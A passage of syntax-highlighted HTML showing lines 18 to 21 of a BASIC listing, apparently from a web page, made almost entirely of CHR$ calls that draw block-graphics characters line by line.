number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">148</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">188</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">183</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span 